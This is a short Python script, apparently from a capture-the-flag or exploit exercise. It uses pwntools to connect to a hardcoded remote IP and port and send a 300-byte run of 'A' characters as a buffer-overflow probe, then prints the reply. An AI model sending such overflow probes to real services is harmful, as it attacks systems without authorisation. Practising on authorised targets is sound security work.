import pwn

r = pwn.remote("124.16.75.117", 51003)

payload = b"A" * 300


r.sendlineafter("Input:\n", payload)

result = r.recvline()

print(result.decode())
